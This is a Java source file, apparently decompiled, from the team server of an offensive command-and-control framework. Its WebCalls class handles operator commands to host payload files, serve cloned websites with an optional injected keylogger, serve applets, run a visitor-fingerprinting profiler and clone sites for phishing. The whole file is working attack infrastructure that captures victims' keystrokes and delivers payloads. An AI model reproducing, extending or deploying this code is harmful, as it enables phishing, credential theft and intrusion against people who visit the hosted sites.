package server;

import c2profile.Profile;
import cloudstrike.Keylogger;
import cloudstrike.ServeApplet;
import cloudstrike.ServeFile;
import cloudstrike.StaticContent;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import common.CommonUtils;
import common.LoggedEvent;
import common.MudgeSanity;
import common.Reply;
import common.Request;
import common.WebEvent;
import common.WebTransforms;
import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import profiler.SystemProfiler;

public class WebCalls implements ServerHook, WebServer.WebListener {
   protected Map servers = new HashMap();
   protected Resources resources;

   public void register(Map var1) {
      var1.put("cloudstrike.host_file", this);
      var1.put("cloudstrike.host_site", this);
      var1.put("cloudstrike.host_data", this);
      var1.put("cloudstrike.start_profiler", this);
      var1.put("cloudstrike.host_applet", this);
      var1.put("cloudstrike.kill_site", this);
      var1.put("cloudstrike.clone_site", this);
   }

   public WebCalls(Resources var1) {
      this.resources = var1;
      this.broadcastSiteModel();
   }

   public List buildSiteModel() {
      LinkedList var1 = new LinkedList();
      synchronized(this) {
         Iterator var3 = this.servers.entrySet().iterator();

         while(var3.hasNext()) {
            Map.Entry var4 = (Map.Entry)var3.next();
            WebServer var5 = (WebServer)var4.getValue();
            List var6 = var5.sites();
            Iterator var7 = var6.iterator();

            while(var7.hasNext()) {
               Map var8 = (Map)var7.next();
               var8.put("Port", var4.getKey() + "");
               var1.add(var8);
            }
         }

         return var1;
      }
   }

   public void broadcastSiteModel() {
      this.resources.broadcast("sites", this.buildSiteModel(), true);
   }

   public void receivedClient(String var1, String var2, Properties var3, Properties var4, String var5, int var6, boolean var7, String var8, long var9) {
      String var11 = ServerUtils.getRemoteAddress(ServerUtils.getProfile(this.resources), var3);
      String var12 = var3.get("User-Agent") + "";
      String var13 = var4.get("id") + "";
      String var14 = var3.get("Cookie") + "";
      this.resources.broadcast("weblog", new WebEvent(var2, var1, var11, var12, "unknown", var5, new HashMap(var4), var8, var9, var6));
   }

   public WebServer getWebServer(int var1) throws IOException {
      synchronized(this) {
         WebServer var3;
         if (!this.servers.containsKey(var1 + "")) {
            var3 = new WebServer(var1);
            var3.addWebListener(this);
            var3.setResponseFilter(new WebTransforms(ServerUtils.getProfile(this.resources)));
            this.servers.put(var1 + "", var3);
            return var3;
         } else {
            var3 = (WebServer)this.servers.get(var1 + "");
            if (var3.isSSL()) {
               throw new IOException("Web server bound to " + var1 + " is SSL");
            } else {
               return var3;
            }
         }
      }
   }

   public WebServer getSecureWebServer(int var1) throws IOException {
      return this.getSecureWebServer(ServerUtils.getProfile(this.resources), var1);
   }

   public WebServer getSecureWebServer(Profile var1, int var2) throws IOException {
      synchronized(this) {
         WebServer var4;
         if (!this.servers.containsKey(var2 + "")) {
            var4 = new WebServer(var2, true, var1.getSSLKeystore(), var1.getSSLPassword());
            var4.addWebListener(this);
            var4.setResponseFilter(new WebTransforms(ServerUtils.getProfile(this.resources)));
            this.servers.put(var2 + "", var4);
            return var4;
         } else {
            var4 = (WebServer)this.servers.get(var2 + "");
            if (!var4.isSSL()) {
               throw new IOException("Web server bound to " + var2 + " is not SSL");
            } else {
               return var4;
            }
         }
      }
   }

   public boolean isServing(int var1) {
      synchronized(this) {
         return this.servers.containsKey(var1 + "");
      }
   }

   public void host_file(Request var1, ManageUser var2) {
      File var3 = new File(var1.arg(4) + "");
      String var4 = var1.arg(5) + "";
      if (!CommonUtils.isSafeFile(new File("uploads"), var3)) {
         CommonUtils.print_error(var2.getNick() + " attempted to host " + var3 + " (unsafe)");
         var2.writeNow(var1.reply("Failed: File '" + var3 + "' is not in uploads."));
      } else if (!var3.exists()) {
         var2.writeNow(var1.reply("Failed: File '" + var3 + "' does not exist.\nI can't host it."));
      } else if (!var3.canRead()) {
         var2.writeNow(var1.reply("Failed: I can't read the file. How can I serve it?"));
      } else {
         ServeFile var5 = new ServeFile(var3, var4);
         this.finishWebCall2(var1, var2, "file " + var3, var5);
      }
   }

   public void host_site(Request var1, ManageUser var2) {
      String var3 = var1.arg(4) + "";
      String var4 = var1.arg(5) + "";
      String var5 = var1.arg(6) + "";
      String var6 = var1.arg(7) + "";
      if ("true".equals(var4)) {
         Keylogger var7 = new Keylogger(var3, "text/html", var5);
         var7.addKeyloggerListener(new KeyloggerHandler(this.resources, var6));
         this.finishWebCall2(var1, var2, "cloned site: " + var6, var7);
      } else {
         StaticContent var8 = new StaticContent(var3, "text/html", var5);
         this.finishWebCall2(var1, var2, "cloned site: " + var6, var8);
      }

   }

   public void host_data(Request var1, ManageUser var2) {
      String var3 = var1.arg(4) + "";
      String var4 = var1.arg(5) + "";
      String var5 = var1.arg(6) + "";
      StaticContent var6 = new StaticContent(var3, var4, var5);
      this.finishWebCall2(var1, var2, var5, var6);
   }

   public void host_applet(Request var1, ManageUser var2) {
      byte[] var3 = (byte[])((byte[])var1.arg(4));
      String var4 = var1.arg(5) + "";
      String var5 = var1.arg(6) + "";
      String var6 = var1.arg(7) + "";
      ServeApplet var7 = new ServeApplet(var3, var4, new byte[0], var6, var5);
      this.finishWebCall2(var1, var2, var6, var7);
   }

   protected void finishWebCall2(Request var1, ManageUser var2, String var3, WebService var4) {
      String var5 = var1.arg(0) + "";
      int var6 = (Integer)var1.arg(1);
      boolean var7 = (Boolean)var1.arg(2);
      String var8 = var1.arg(3) + "";
      String var9 = var7 ? "https://" : "http://";

      try {
         synchronized(this) {
            WebServer var11 = var7 ? this.getSecureWebServer(var6) : this.getWebServer(var6);
            var11.associate(var8, var5);
            var4.setup(var11, var8);
         }

         var2.writeNow(var1.reply("success"));
         this.broadcastSiteModel();
         this.resources.broadcast("eventlog", LoggedEvent.NewSite(var2.getNick(), var9 + var5 + ":" + var6 + var8, var3));
      } catch (Exception var14) {
         MudgeSanity.logException(var3 + ": " + var8, var14, true);
         var2.writeNow(var1.reply("Failed: " + var14.getMessage()));
      }

   }

   public void start_profiler(Request var1, ManageUser var2) {
      String var3 = var1.argz(4);
      String var4 = var1.argz(5);
      String var5 = var1.argz(6);
      SystemProfiler var6;
      if (var3 != null) {
         var6 = new SystemProfiler(var3, var5, var4);
         var6.addProfileListener(new ProfileHandler(this.resources));
         this.finishWebCall2(var1, var2, "system profiler", var6);
      } else {
         var6 = new SystemProfiler(var5, var4);
         var6.addProfileListener(new ProfileHandler(this.resources));
         this.finishWebCall2(var1, var2, "system profiler", var6);
      }

   }

   public void kill_site(Request var1, ManageUser var2) {
      int var3 = Integer.parseInt(var1.arg(0) + "");
      String var4 = var1.arg(1) + "";
      this.deregister(var3, var4);
   }

   public void deregister(int var1, String var2) {
      synchronized(this) {
         if (this.isServing(var1)) {
            WebServer var4 = (WebServer)this.servers.get(var1 + "");
            if (var4 != null && var4.deregister(var2)) {
               this.servers.remove(var1 + "");
            }

            this.broadcastSiteModel();
         }
      }
   }

   public void call(Request var1, ManageUser var2) {
      if (var1.is("cloudstrike.host_file", 6)) {
         this.host_file(var1, var2);
      } else if ("cloudstrike.kill_site".equals(var1.getCall()) && var1.size() == 2) {
         this.kill_site(var1, var2);
      } else if (var1.is("cloudstrike.host_data", 7)) {
         this.host_data(var1, var2);
      } else if (var1.is("cloudstrike.start_profiler", 7)) {
         this.start_profiler(var1, var2);
      } else if (var1.is("cloudstrike.clone_site", 1)) {
         new WebsiteCloneTool(var1, var2);
      } else if (var1.is("cloudstrike.host_site", 8)) {
         this.host_site(var1, var2);
      } else if (var1.is("cloudstrike.host_applet", 8)) {
         this.host_applet(var1, var2);
      } else {
         var2.writeNow(new Reply("server_error", 0L, var1 + ": incorrect number of arguments"));
      }

   }
}
